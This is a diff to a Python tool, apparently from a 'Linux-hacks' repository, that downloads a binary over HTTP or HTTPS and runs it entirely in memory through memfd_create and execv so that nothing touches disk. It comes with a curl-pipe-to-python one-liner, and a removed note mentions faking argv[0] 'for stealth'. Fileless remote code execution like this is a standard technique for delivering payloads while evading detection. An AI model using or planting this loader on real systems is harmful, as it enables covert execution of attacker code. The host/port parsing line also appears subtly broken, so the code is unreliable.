@@ -1,34 +1,53 @@
 """
-Pull a binary via HTTP and execute it in memory (does not touch disk). You can run it like this:
+Pull a binary via http(s) and execute it in memory (does not touch disk).
+You can run it like this:
 
-python <(curl -s https://raw.githubusercontent.com/tav-r/Linux-hacks/main/fileless.py) binary -a -b -c
-
-TODO:
-    - Make it possible to change HTTP source
-    - HTTPS option
-    - Fake argv[0] for stealth
+python <(curl -s https://URL1/fileless.py) https://URL2/binary -a -b -c
 """
 
 from ctypes import CDLL
 from os import execv
-from socket import socket
-from sys import argv
+from http import client as http_client
 
-PL_SRC = ("localhost", 8080)
-PL_PATH = argv[1]
-PARMS = argv[2:]
 
-s = socket()
-s.connect(PL_SRC)
-s.send(f"GET /{PL_PATH} HTTP/1.1\r\n\r\n".encode())
+def fetch_and_execv(url: str, params: list[str]):
+    """
+    Fetch a binary or a script beginning with a hash-bang and execute it in
+    memory.
 
-RES = REC = s.recv(1024)
-while REC:
-    REC = s.recv(1024)
-    RES += REC
+    This method does not return since it calls execv.
 
-path = f"/proc/self/fd/{CDLL('libc.so.6').memfd_create('a', 0)}"
-with open(path, "wb+") as memfile:
-    memfile.write(RES.split(b"\r\n\r\n", 2)[1])
+    Args:
+        url (str): http(s) location of the executable
+        params (list[str]): list of command line arguments for the executable
+    """
 
-execv(path, [path] + PARMS)
+    # parse url
+    protocol, uri = url.split("://", 1)
+    host_port, location = uri.split("/", 1)
+    host, port = host_port.split(":", 1) if ":" in host_port else\
+        host_port, 443 if protocol == "https" else 80
+
+    # connect and fetch executable
+    if protocol == "http":
+        client = http_client.HTTPConnection(host, port)
+    elif protocol == "https":
+        client = http_client.HTTPSConnection(host, port)
+    else:
+        raise NotImplementedError(f"cannot handle '{protocol}'")
+
+    client.connect()
+    client.request("GET", location)
+    res = client.getresponse().read()
+
+    # create memfd, write binary into it and execute
+    path = f"/proc/self/fd/{CDLL('libc.so.6').memfd_create('a', 0)}"
+    with open(path, "wb+") as memfile:
+        memfile.write(res)
+
+    execv(path, [path] + params)
+
+
+if __name__ == "__main__":
+    from sys import argv
+    fetch_and_execv(argv[1], argv[2:])
